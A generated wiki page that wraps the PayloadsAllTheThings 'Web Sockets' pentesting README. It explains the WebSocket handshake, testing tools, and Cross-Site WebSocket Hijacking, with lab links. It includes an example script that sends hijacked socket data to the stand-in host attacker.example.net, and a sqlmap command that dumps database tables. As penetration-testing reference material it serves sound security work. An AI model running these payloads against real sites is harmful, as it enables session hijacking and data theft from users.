---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Web Sockets

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-web-sockets-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Web Sockets/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Web Sockets](../../topics/web-sockets/web-sockets.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-web-sockets-readme |
| name | Web Sockets |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Sockets/README.md |

## Preserved Source Material

````yaml
_body: "# Web Sockets\n\n> WebSocket is a communication protocol that provides full-duplex communication channels over a single,\
  \ long-lived connection. This enables real-time, bi-directional communication between clients (typically web browsers) and\
  \ servers through a persistent connection. WebSockets are commonly used for web applications that require frequent, low-latency\
  \ updates, such as live chat applications, online gaming, real-time notifications, and financial trading platforms.\n\n\
  ## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Web Socket Protocol](#web-socket-protocol)\n    *\
  \ [SocketIO](#socketio)\n    * [Using wsrepl](#using-wsrepl)\n    * [Using ws-harness.py](#using-ws-harnesspy)\n* [Cross-Site\
  \ WebSocket Hijacking (CSWSH)](#cross-site-websocket-hijacking-cswsh)\n* [Labs](#labs)\n* [References](#references)\n\n\
  ## Tools\n\n* [doyensec/wsrepl](https://github.com/doyensec/wsrepl) - WebSocket REPL for pentesters\n* [mfowl/ws-harness.py](https://gist.githubusercontent.com/mfowl/ae5bc17f986d4fcc2023738127b06138/raw/e8e82467ade45998d46cef355fd9b57182c3e269/ws.harness.py)\n\
  * [PortSwigger/websocket-turbo-intruder](https://github.com/PortSwigger/websocket-turbo-intruder) - Fuzz WebSockets with\
  \ custom Python code\n* [snyk/socketsleuth](https://github.com/snyk/socketsleuth) - Burp Extension to add additional functionality\
  \ for pentesting websocket based applications\n\n## Methodology\n\n### Web Socket Protocol\n\nWebSockets start as a normal\
  \ `HTTP/1.1` request and then upgrade the connection to use the WebSocket protocol.\n\nThe client sends a specially crafted\
  \ HTTP request with headers indicating it wants to switch to the WebSocket protocol:\n\n```http\nGET /chat HTTP/1.1\nHost:\
  \ example.com:80\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version:\
  \ 13\n```\n\nServer responds with an `HTTP 101 Switching Protocols` response. If the server accepts the request, it replies\
  \ like this.\n\n```http\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept:\
  \ s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\n```\n\n### SocketIO\n\nSocket.IO is a JavaScript library (for both client and server) that\
  \ provides a higher-level abstraction over WebSockets, designed to make real-time communication easier and more reliable\
  \ across browsers and environments.\n\n### Using wsrepl\n\n`wsrepl`, a tool developed by Doyensec, aims to simplify the\
  \ auditing of websocket-based apps. It offers an interactive REPL interface that is user-friendly and easy to automate.\
  \ The tool was developed during an engagement with a client whose web application heavily relied on WebSockets for soft\
  \ real-time communication.\n\nwsrepl is designed to provide a balance between an interactive REPL experience and automation.\
  \ It is built with Python’s TUI framework Textual, and it interoperates with curl’s arguments, making it easy to transition\
  \ from the Upgrade request in Burp to wsrepl. It also provides full transparency of WebSocket opcodes as per RFC 6455 and\
  \ has an automatic reconnection feature in case of disconnects.\n\n```ps1\npip install wsrepl\nwsrepl -u URL -P auth_plugin.py\n\
  ```\n\nMoreover, wsrepl simplifies the process of transitioning into WebSocket automation. Users just need to write a Python\
  \ plugin. The plugin system is designed to be flexible, allowing users to define hooks that are executed at various stages\
  \ of the WebSocket lifecycle (init, on_message_sent, on_message_received, ...).\n\n```py\nfrom wsrepl import Plugin\nfrom\
  \ wsrepl.WSMessage import WSMessage\n\nimport json\nimport requests\n\nclass Demo(Plugin):\n    def init(self):\n      \
  \  token = requests.get(\"https://example.com/uuid\").json()[\"uuid\"]\n        self.messages = [\n            json.dumps({\n\
  \                \"auth\": \"session\",\n                \"sessionId\": token\n            })\n        ]\n\n    async def\
  \ on_message_sent(self, message: WSMessage) -> None:\n        original = message.msg\n        message.msg = json.dumps({\n\
  \            \"type\": \"message\",\n            \"data\": {\n                \"text\": original\n            }\n      \
  \  })\n        message.short = original\n        message.long = message.msg\n\n    async def on_message_received(self, message:\
  \ WSMessage) -> None:\n        original = message.msg\n        try:\n            message.short = json.loads(original)[\"\
  data\"][\"text\"]\n        except:\n            message.short = \"Error: could not parse message\"\n\n        message.long\
  \ = original\n```\n\n### Using ws-harness.py\n\nStart `ws-harness` to listen on a web-socket, and specify a message template\
  \ to send to the endpoint.\n\n```powershell\npython ws-harness.py -u \"ws://dvws.local:8080/authenticate-user\" -m ./message.txt\n\
  ```\n\nThe content of the message should contains the **[FUZZ]** keyword.\n\n```json\n{\n    \"auth_user\":\"dGVzda==\"\
  ,\n    \"auth_pass\":\"[FUZZ]\"\n}\n```\n\nThen you can use any tools against the newly created web service, working as\
  \ a proxy and tampering on the fly the content of message sent thru the websocket.\n\n```python\nsqlmap -u http://127.0.0.1:8000/?fuzz=test\
  \ --tables --tamper=base64encode --dump\n```\n\n## Cross-Site WebSocket Hijacking (CSWSH)\n\nIf the WebSocket handshake\
  \ is not correctly protected using a CSRF token or a\nnonce, it's possible to use the authenticated WebSocket of a user\
  \ on an\nattacker's controlled site because the cookies are automatically sent by the\nbrowser. This attack is called Cross-Site\
  \ WebSocket Hijacking (CSWSH).\n\nExample exploit, hosted on an attacker's server, that exfiltrates the received\ndata from\
  \ the WebSocket to the attacker:\n\n```html\n<script>\n  ws = new WebSocket('wss://vulnerable.example.com/messages');\n\
  \  ws.onopen = function start(event) {\n    ws.send(\"HELLO\");\n  }\n  ws.onmessage = function handleReply(event) {\n \
  \   fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});\n  }\n  ws.send(\"Some text sent to the server\"\
  );\n</script>\n```\n\nYou have to adjust the code to your exact situation. E.g. if your web\napplication uses a `Sec-WebSocket-Protocol`\
  \ header in the handshake request,\nyou have to add this value as a 2nd parameter to the `WebSocket` function call\nin order\
  \ to add this header.\n\n## Labs\n\n* [PortSwigger - Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)\n\
  * [PortSwigger - Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)\n\
  * [PortSwigger - Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)\n\
  * [Root Me - Web Socket - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/Web-Socket-0-protection)\n\n##\
  \ References\n\n* [Cross Site WebSocket Hijacking with socketio - Jimmy Li - August 17, 2020](https://web.archive.org/web/20201031111408/https://blog.jimmyli.us/articles/2020-08/Cross-Site-WebSocket-Hijacking-With-SocketIO)\n\
  * [Hacking Web Sockets: All Web Pentest Tools Welcomed - Michael Fowl - March 5, 2019](https://web.archive.org/web/20190306170840/https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)\n\
  * [Hacking with WebSockets - Mike Shema, Sergey Shekyan, Vaagn Toukharian - September 20, 2012](https://web.archive.org/web/20120920142933/https://media.blackhat.com/bh-us-12/Briefings/Shekyan/BH_US_12_Shekyan_Toukharian_Hacking_Websocket_Slides.pdf)\n\
  * [Mini WebSocket CTF - Snowscan - January 27, 2020](https://snowscan.io/bbsctf-evilconneck/#)\n* [Streamlining Websocket\
  \ Pentesting with wsrepl - Andrez Konstantinov - July 18, 2023](https://web.archive.org/web/20230718132013/https://blog.doyensec.com/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html)\n\
  * [Testing for WebSockets security vulnerabilities - PortSwigger - September 28, 2019](https://web.archive.org/web/20190928112120/https://portswigger.net/web-security/websockets)\n\
  * [WebSocket Attacks - HackTricks - July 19, 2024](https://web.archive.org/web/20241217220834/https://book.hacktricks.xyz/pentesting-web/websocket-attacks)"
_relative_path: Web Sockets/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Web Sockets/README.md
````
